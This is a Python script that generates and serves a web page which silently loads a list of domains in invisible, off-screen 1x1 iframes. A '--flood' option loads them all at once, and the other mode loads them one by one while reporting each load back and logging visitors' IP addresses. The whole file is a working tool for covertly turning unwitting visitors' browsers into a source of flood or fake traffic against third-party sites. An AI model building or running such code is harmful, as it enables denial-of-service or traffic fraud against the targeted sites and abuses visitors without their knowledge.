import http.server
import socketserver
import json
import sys

# HTML Generator
def generate_html(domains, flood_mode):
    html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cluster</title>
    <style>
        iframe {
            width: 1px;
            height: 1px;
            border: none;
            position: absolute;
            top: -9999px;
            left: -9999px;
        }
    </style>
</head>
<body>
"""
    if flood_mode:
        # Generate all iframes to load at once with no JavaScript
        for domain in domains:
            html += f'    <iframe src="https://{domain}"></iframe>\n'
    else:
        # Generate sequential iframe loading script with JavaScript
        html += """
    <script>
        const domains = [""" + ", ".join(f'"{domain}"' for domain in domains) + """];
        async function loadDomains() {
            for (const domain of domains) {
                const iframe = document.createElement('iframe');
                iframe.src = `https://${domain}`;
                document.body.appendChild(iframe);

                // Send status back to the server
                await fetch('/report', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ status: 'iframe loaded', domain })
                });

                // Add delay
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        }
        loadDomains();
    </script>
"""
    html += """
</body>
</html>
"""
    return html

# HTTP Server with Custom Handler
class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Log the client's IP address for flood mode iframe requests
        client_ip = self.client_address[0]
        print(f"GET request from {client_ip} for {self.path}")
        super().do_GET()  # Call the default GET handler

    def do_POST(self):
        if self.path == '/report':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                # Log the data with the client's IP address
                client_ip = self.client_address[0]
                print(f"Data received from {client_ip}:", data)
            except json.JSONDecodeError:
                print(f"Invalid JSON received from {self.client_address[0]}.")
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    # Suppress all default HTTP request logs
    def log_message(self, format, *args):
        pass  # Override to disable logging

# Main Function
def main():
    # Check for --flood flag
    flood_mode = '--flood' in sys.argv

    # Read domains from domains.txt
    try:
        with open('domains.txt') as iFile:
            domains = iFile.read().splitlines()
    except FileNotFoundError:
        print("Error: domains.txt not found.")
        sys.exit(1)

    # Generate the index.html file
    html_content = generate_html(domains, flood_mode)
    with open("index.html", "w") as file:
        file.write(html_content)
    print(f"Generated index.html with {'flood mode' if flood_mode else 'sequential mode'}.")

    # Start the HTTP server
    with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
        print(f"Serving at http://0.0.0.0:{PORT}")
        httpd.serve_forever()

if __name__ == "__main__":
    PORT = 8002
    main()
